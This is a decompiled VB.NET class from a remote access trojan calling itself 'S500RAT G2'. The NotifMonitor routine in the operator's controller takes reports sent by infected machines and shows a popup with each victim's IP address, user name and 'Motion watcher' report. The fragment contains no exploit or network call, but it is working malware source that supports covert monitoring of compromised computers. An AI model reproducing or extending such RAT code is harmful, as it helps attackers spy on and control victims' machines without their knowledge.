Imports System
Imports System.Drawing
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports S500RAT.My.Resources
Imports S500RAT.Server.Connection
Imports Tulpep.NotificationWindow

Namespace S500RAT
	' Token: 0x02000071 RID: 113
	Public Class NotifMonitor
		' Token: 0x06001206 RID: 4614 RVA: 0x000A3398 File Offset: 0x000A1598
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Dim asString As String = unpack_msgpack.ForcePathObject("Report").AsString
			Dim asString2 As String = unpack_msgpack.ForcePathObject("User").AsString
			Dim ip As String = client.IP
			New PopupNotifier() With { .Size = New Size(350, 120), .ImageSize = New Size(90, 90), .Image = Resources.S42, .HeaderHeight = 1, .ShowCloseButton = False, .ShowGrip = False, .TitleFont = New Font("Microsoft YaHei", 8F, FontStyle.Bold), .ContentFont = New Font("Arial", 8F, FontStyle.Bold), .ContentText = String.Concat(New String() { vbCrLf & "IP : ", ip, vbCrLf & "User : ", asString2, vbCrLf & "Report : ", asString }), .ContentColor = Color.Black, .TitleColor = Color.Black, .TitleText = Strings.Space(30) + "S500 RAT G2( Motion watcher )", .BodyColor = Color.Orange, .BorderColor = Color.Orange }.Popup()
		End Sub
	End Class
End Namespace
